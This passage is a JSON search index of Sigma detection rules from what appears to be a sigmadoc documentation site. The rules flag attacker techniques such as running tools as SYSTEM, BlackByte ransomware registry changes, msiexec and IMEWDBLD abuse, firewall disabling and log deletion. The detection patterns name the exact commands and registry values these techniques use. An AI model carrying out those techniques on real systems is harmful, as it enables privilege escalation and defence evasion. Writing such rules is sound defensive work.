\u0026#39;\\nircmdc.exe\u0026#39; selection_params: CommandLine|contains: - \u0026#39; execmd \u0026#39; - \u0026#39; exec2 \u0026#39; selection_commands: CommandLine|contains: - \u0026#39; copy \u0026#39; - \u0026#39; del \u0026#39; condition: selection or ( selection_params and selection_commands ) fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tool_nircmd.yml/","tags":["attack.execution","attack.t1569.002","attack.s0029"],"title":"NirCmd Tool Execution"},{"categories":null,"contents":"Detects the use of NirCmd tool for command execution as SYSTEM user\nKnown false-positives Legitimate use by administrators References https://www.nirsoft.net/utils/nircmd.html https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ https://www.nirsoft.net/utils/nircmd2.html#using Raw rule (edit) title: NirCmd Tool Execution As LOCAL SYSTEM id: d9047477-0359-48c9-b8c7-792cedcdc9c4 status: experimental description: Detects the use of NirCmd tool for command execution as SYSTEM user author: \u0026#39;Florian Roth, Nasreddine Bencherchali @nas_bench\u0026#39; date: 2022/01/24 references: - https://www.nirsoft.net/utils/nircmd.html - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ - https://www.nirsoft.net/utils/nircmd2.html#using tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39; runassystem \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tool_nircmd_as_system.yml/","tags":["attack.execution","attack.t1569.002","attack.s0029"],"title":"NirCmd Tool Execution As LOCAL SYSTEM"},{"categories":null,"contents":"Detects the use of NSudo tool for command execution\nKnown false-positives Legitimate use by administrators References https://nsudo.m2team.org/en-us/ https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ Raw rule (edit) title: NSudo Tool Execution As System id: 771d1eb5-9587-4568-95fb-9ec44153a012 status: experimental description: Detects the use of NSudo tool for command execution author: Florian Roth date: 2022/01/24 references: - https://nsudo.m2team.org/en-us/ - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\NSudo.exe\u0026#39; CommandLine|contains: \u0026#39; -U:S \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tool_nsudo_as_system.yml/","tags":["attack.execution","attack.t1569.002","attack.s0029"],"title":"NSudo Tool Execution As System"},{"categories":null,"contents":"Detects the use of RunXCmd tool for command execution\nKnown false-positives Legitimate use by administrators References https://www.d7xtech.com/free-software/runx/ https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ Raw rule (edit) title: RunXCmd Tool Execution As System id: 93199800-b52a-4dec-b762-75212c196542 status: experimental description: Detects the use of RunXCmd tool for command execution author: Florian Roth date: 2022/01/24 references: - https://www.d7xtech.com/free-software/runx/ - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/ tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; /account=system \u0026#39; - \u0026#39;/exec=\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tool_runx_as_system.yml/","tags":["attack.execution","attack.t1569.002","attack.s0029"],"title":"RunXCmd Tool Execution As System"},{"categories":null,"contents":"BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption\nKnown false-positives Unknown References https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter\u0026amp;utm_medium=social https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/ Raw rule (edit) title: Blackbyte Ransomware Registry id: 83314318-052a-4c90-a1ad-660ece38d276 description: BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption author: frack113 date: 2022/01/24 status: experimental references: - https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter\u0026amp;utm_medium=social - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/ logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject: - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLinkedConnections - HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\LongPathsEnabled Details: DWORD (0x00000001) condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_blackbyte_ransomware.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Blackbyte Ransomware Registry"},{"categories":null,"contents":"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md#t1071001---web-protocols Raw rule (edit) title: Change User Agents with WebRequest id: d4488827-73af-4f8d-9244-7b7662ef046e status: experimental author: frack113 date: 2022/01/23 description: | Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md#t1071001---web-protocols logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Invoke-WebRequest - \u0026#39;-UserAgent \u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_invoke_webrequest_useragent.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Change User Agents with WebRequest"},{"categories":null,"contents":"Uses the .NET InstallUtil.exe application in order to execute image without log\nKnown false-positives Unknown References https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool Raw rule (edit) title: Suspicious Execution of InstallUtil Without Log id: d042284c-a296-4988-9be5-f424fadcc28c status: experimental description: Uses the .NET InstallUtil.exe application in order to execute image without log author: frack113 references: - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ - https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool date: 2022/01/23 modified: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\InstallUtil.exe Image|contains: Microsoft.NET\\Framework CommandLine|contains|all: - \u0026#39;/logfile= \u0026#39; - \u0026#39;/LogToConsole=false\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_instalutil.yml/","tags":["attack.defense_evasion"],"title":"Suspicious Execution of InstallUtil Without Log"},{"categories":null,"contents":"Use IMEWDBLD.exe (built-in to windows) to download a file\nKnown false-positives Legitimate script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/ Raw rule (edit) title: Download a File with IMEWDBLD.exe id: 8d7e392e-9b28-49e1-831d-5949c6281228 status: experimental description: Use IMEWDBLD.exe (built-in to windows) to download a file author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/ date: 2022/01/22 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; Image|endswith: \u0026#39;\\IMEWDBLD.exe\u0026#39; condition: selection falsepositives: - Legitimate script level: high tags: - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_imewdbld.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Download a File with IMEWDBLD.exe"},{"categories":null,"contents":"Hides the file extension through modification of the registry\nKnown false-positives Administrative scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone https://docs.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries Raw rule (edit) title: IE Change Domain Zone id: 45e112d0-7759-4c2a-aa36-9f8fb79d3393 description: Hides the file extension through modification of the registry author: frack113 date: 2022/01/22 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone - https://docs.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries logsource: category: registry_event product: windows detection: selection_domains: EventType: SetValue TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\ filter: Details: - DWORD (0x00000000) # My Computer - DWORD (0x00000001) # Local Intranet Zone condition: selection_domains falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_change_security_zones.yml/","tags":["attack.persistence","attack.t1137"],"title":"IE Change Domain Zone"},{"categories":null,"contents":"Use \u0026ldquo;\u0026gt;\u0026rdquo; to redicrect information in commandline\nKnown false-positives Unknown References https://ss64.com/nt/syntax-redirection.html Raw rule (edit) title: Redirect Output in CommandLine id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a status: experimental description: Use \u0026#34;\u0026gt;\u0026#34; to redicrect information in commandline author: frack113 references: - https://ss64.com/nt/syntax-redirection.html date: 2022/01/22 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine|contains: \u0026#39;\u0026gt;\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cmd_redirect.yml/","tags":["attack.discovery","attack.t1082"],"title":"Redirect Output in CommandLine"},{"categories":null,"contents":"Hides the file extension through modification of the registry\nKnown false-positives Administrative scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd https://unit42.paloaltonetworks.com/ransomware-families/ https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A Raw rule (edit) title: Registry Modification to Hidden File Extension id: 5df86130-4e95-4a54-90f7-26541b40aec2 description: Hides the file extension through modification of the registry author: frack113 date: 2022/01/22 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd - https://unit42.paloaltonetworks.com/ransomware-families/ - https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A logsource: category: registry_event product: windows detection: selection_HideFileExt: EventType: SetValue TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt Details: DWORD (0x00000001) selection_Hidden: EventType: SetValue TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden Details: DWORD (0x00000002) condition: 1 of selection_* falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_hidden_extention.yml/","tags":["attack.persistence","attack.t1137"],"title":"Registry Modification to Hidden File Extension"},{"categories":null,"contents":"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md#atomic-test-1---openssl-c2 https://medium.com/walmartglobaltech/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926 Raw rule (edit) title: Suspicious SSL Connection id: 195626f3-5f1b-4403-93b7-e6cfd4d6a078 status: experimental description: Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md#atomic-test-1---openssl-c2 - https://medium.com/walmartglobaltech/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926 author: frack113 date: 2022/01/23 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - System.Net.Security.SslStream - Net.Security.RemoteCertificateValidationCallback - \u0026#39;.AuthenticateAsClient\u0026#39; condition: selection falsepositives: - legitimate administrative script level: low tags: - attack.command_and_control - attack.t1573 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_ssl_keyword.yml/","tags":["attack.command_and_control","attack.t1573"],"title":"Suspicious SSL Connection"},{"categories":null,"contents":"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443.\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md#atomic-test-1---testing-usage-of-uncommonly-used-port-with-powershell https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps Raw rule (edit) title: Testing Usage of Uncommonly Used Port id: adf876b3-f1f8-4aa9-a4e4-a64106feec06 status: experimental description: | Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md#atomic-test-1---testing-usage-of-uncommonly-used-port-with-powershell - https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps author: frack113 date: 2022/01/23 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - Test-NetConnection - \u0026#39;-ComputerName \u0026#39; - \u0026#39;-port \u0026#39; filter: ScriptBlockText|contains: - \u0026#39; 443 \u0026#39; - \u0026#39; 80 \u0026#39; condition: selection and not filter falsepositives: - legitimate administrative script level: medium tags: - attack.command_and_control - attack.t1571 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_test_netconnection.yml/","tags":["attack.command_and_control","attack.t1571"],"title":"Testing Usage of Uncommonly Used Port"},{"categories":null,"contents":"Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.\nKnown false-positives Admin activity References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md https://attack.mitre.org/techniques/T1562/004/ https://firewalld.org/documentation/man-pages/firewall-cmd.html Raw rule (edit) title: Disable System Firewall id: 53059bc0-1472-438b-956a-7508a94a91f0 status: experimental description: Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network. author: \u0026#39;Pawel Mazur\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md - https://attack.mitre.org/techniques/T1562/004/ - https://firewalld.org/documentation/man-pages/firewall-cmd.html date: 2022/01/22 logsource: product: linux service: auditd detection: service_stop: type: \u0026#39;SERVICE_STOP\u0026#39; unit: - \u0026#39;firewalld\u0026#39; - \u0026#39;iptables\u0026#39; - \u0026#39;ufw\u0026#39; condition: service_stop falsepositives: - Admin activity level: high tags: - attack.t1562.004 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_disable_system_firewall.yml/","tags":["attack.t1562.004","attack.defense_evasion"],"title":"Disable System Firewall"},{"categories":null,"contents":"Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\\nKnown false-positives Unknown References https://twitter.com/eral4m/status/1480468728324231172?s=20 Raw rule (edit) title: Suspicious Creation with Colorcpl id: e15b518d-b4ce-4410-a9cd-501f23ce4a18 status: experimental description: Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\ author: frack113 references: - https://twitter.com/eral4m/status/1480468728324231172?s=20 date: 2022/01/21 logsource: product: windows category: file_event detection: selection: Image|endswith: \\colorcpl.exe valid_ext: TargetFilename|endswith: - .icm - .gmmp - .cdmp - .camp condition: selection and not valid_ext falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_colorcpl.yml/","tags":["attack.defense_evasion","attack.t1564"],"title":"Suspicious Creation with Colorcpl"},{"categories":null,"contents":"Detects driver load events that got blocked by Windows code integrity checks\nKnown false-positives Unknown References https://twitter.com/SBousseaden/status/1483810148602814466 Raw rule (edit) title: Code Integrity Blocked Driver Load id: f8931561-97f5-4c46-907f-0a4a592e47a7 description: Detects driver load events that got blocked by Windows code integrity checks author: Florian Roth status: experimental references: - https://twitter.com/SBousseaden/status/1483810148602814466 date: 2022/01/20 tags: - attack.execution logsource: product: windows service: codeintegrity-operational detection: keywords: - \u0026#39;that did not meet the Microsoft signing level requirements\u0026#39; condition: keywords falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/code_integrity/win_codeintegrity_failed_driver_load.yml/","tags":["attack.execution"],"title":"Code Integrity Blocked Driver Load"},{"categories":null,"contents":"Detects the creation of doas.conf file in linux host platform.\nKnown false-positives Unlikely References https://research.splunk.com/endpoint/linux_doas_conf_file_creation/ https://www.makeuseof.com/how-to-install-and-use-doas/ Raw rule (edit) title: Linux Doas Conf File Creation id: 00eee2a5-fdb0-4746-a21d-e43fbdea5681 status: stable description: Detects the creation of doas.conf file in linux host platform. references: - https://research.splunk.com/endpoint/linux_doas_conf_file_creation/ - https://www.makeuseof.com/how-to-install-and-use-doas/ author: Sittikorn S, Teoderick Contreras date: 2022/01/20 tags: - attack.privilege_escalation - attack.t1548 logsource: product: linux category: file_create detection: selection: TargetFilename|endswith: \u0026#39;/etc/doas.conf\u0026#39; condition: selection falsepositives: - Unlikely level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/file_create/lnx_doas_conf_creation.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"Linux Doas Conf File Creation"},{"categories":null,"contents":"Detects the doas tool execution in linux host platform.\nKnown false-positives Unlikely References https://research.splunk.com/endpoint/linux_doas_tool_execution/ https://www.makeuseof.com/how-to-install-and-use-doas/ Raw rule (edit) title: Linux Doas Tool Execution id: 067d8238-7127-451c-a9ec-fa78045b618b status: stable description: Detects the doas tool execution in linux host platform. references: - https://research.splunk.com/endpoint/linux_doas_tool_execution/ - https://www.makeuseof.com/how-to-install-and-use-doas/ author: Sittikorn S, Teoderick Contreras date: 2022/01/20 tags: - attack.privilege_escalation - attack.t1548 logsource: product: linux category: process_creation detection: selection: Image|endswith: \u0026#39;/doas\u0026#39; condition: selection falsepositives: - Unlikely level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"Linux Doas Tool Execution"},{"categories":null,"contents":"Detects a suspicious output redirection to the local admins share as often found in malicious scripts or hacktool stagers\nKnown false-positives unknown References https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/ Raw rule (edit) title: Suspicious Redirection to Local Admin Share id: ab9e3b40-0c85-4ba1-aede-455d226fd124 status: experimental description: Detects a suspicious output redirection to the local admins share as often found in malicious scripts or hacktool stagers author: Florian Roth date: 2022/01/16 modified: 2022/02/01 references: - https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/ logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;\u0026gt; \\\\\\\\127.0.0.1\\\\admin$\u0026#39; - \u0026#39;\u0026gt; \\\\\\\\localhost\\\\admin$\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_redir_local_admin_share.yml/","tags":null,"title":"Suspicious Redirection to Local Admin Share"},{"categories":null,"contents":"Deletion of log files is a known anti-forensic technique\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md Raw rule (edit) title: Delete Log from Application id: b1decb61-ed83-4339-8e95-53ea51901720 status: experimental description: Deletion of log files is a known anti-forensic technique author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md date: 2022/01/16 logsource: product: windows category: file_delete detection: selection_teamviewer: TargetFilename|endswith: \u0026#39;.log\u0026#39; TargetFilename|contains: \u0026#39;\\TeamViewer_\u0026#39; filter: Image: C:\\Windows\\system32\\svchost.exe condition: selection_teamviewer and not filter falsepositives: - unknown level: low tags: - attack.defense_evasion - attack.t1070.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_delete/file_delete_win_delete_appli_log.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Delete Log from Application"},{"categories":null,"contents":"Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md#atomic-test-4---disable-administrative-share-creation-at-startup Raw rule (edit) title: Disable Administrative Share Creation at Startup id: c7dcacd0-cc59-4004-b0a4-1d6cdebe6f3e description: Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system author: frack113 date: 2022/01/16 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md#atomic-test-4---disable-administrative-share-creation-at-startup logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\ TargetObject|endswith: - AutoShareWks - AutoShareServer Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1070.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disable_administrative_share.yml/","tags":["attack.defense_evasion","attack.t1070.005"],"title":"Disable Administrative Share Creation at Startup"},{"categories":null,"contents":"Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nKnown false-positives Legitim script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism Raw rule (edit) title: Dism Remove Online Package id: 43e32da2-fdd0-4156-90de-50dfd62636f9 status: experimental description: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images author: frack113 date: 2022/01/16 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism logsource: category: process_creation product: windows detection: selection_dismhost: Image|endswith: \u0026#39;\\DismHost.exe\u0026#39; ParentCommandLine|contains|all: - \u0026#39;/online\u0026#39; - \u0026#39;/Disable-Feature\u0026#39; - \u0026#39;/FeatureName:\u0026#39; - \u0026#39;/Remove\u0026#39; #/NoRestart #/quiet selection_dism: Image|endswith: \u0026#39;\\Dism.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/online\u0026#39; - \u0026#39;/Disable-Feature\u0026#39; - \u0026#39;/FeatureName:\u0026#39; - \u0026#39;/Remove\u0026#39; #/NoRestart #/quiet condition: 1 of selection_* falsepositives: - Legitim script level: medium tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_dsim_remove.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Dism Remove Online Package"},{"categories":null,"contents":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nKnown false-positives Legitimate msiexec over networks References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md Raw rule (edit) title: Msiexec Initiated Connection id: 8e5e38e4-5350-4c0b-895a-e872ce0dd54f status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md date: 2022/01/16 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; condition: selection falsepositives: - Legitimate msiexec over networks level: medium tags: - attack.defense_evasion - attack.t1218.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_msiexec.yml/","tags":["attack.defense_evasion","attack.t1218.007"],"title":"Msiexec Initiated Connection"},{"categories":null,"contents":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nKnown false-positives Legitimate script References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md Raw rule (edit) title: Suspicious Msiexec Execute Arbitrary DLL id: 6f4191bb-912b-48a8-9ce7-682769541e6d status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 date: 2022/01/16 modified: 2022/02/15 references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; CommandLine|contains|all: - \u0026#39; /y\u0026#39; #- \u0026#39;.dll\u0026#39; filter_apple: CommandLine|contains: - \u0026#39;\\MsiExec.exe\u0026#34; /Y \u0026#34;C:\\Program Files\\Bonjour\\mdnsNSP.dll\u0026#39; - \u0026#39;\\MsiExec.exe\u0026#34; /Y \u0026#34;C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll\u0026#39; - \u0026#39;\\MsiExec.exe\u0026#34; /Y \u0026#34;C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll\u0026#39; - \u0026#39;\\MsiExec.exe\u0026#34; /Y \u0026#34;C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Legitimate script level: medium tags: - attack.defense_evasion - attack.t1218.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml/","tags":["attack.defense_evasion","attack.t1218.007"],"title":"Suspicious Msiexec Execute Arbitrary DLL"},{"categories":null,"contents":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nKnown false-positives Legitim script References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md Raw rule (edit) title: Suspicious Msiexec Quiet Install id: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5 status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 date: 2022/01/16 references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; CommandLine|contains|all: - \u0026#39; /i\u0026#39; - \u0026#39; /q\u0026#39; condition: selection falsepositives: - Legitim script level: low tags: - attack.defense_evasion - attack.t1218.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml/","tags":["attack.defense_evasion","attack.t1218.007"],"title":"Suspicious Msiexec Quiet Install"},{"categories":null,"contents":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.\nKnown false-positives unknown References https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md#atomic-test-6---dlp-evasion-via-sensitive-data-in-vba-macro-over-http Raw rule (edit) title: Obfuscated Command Line Using Special Unicode Characters id: 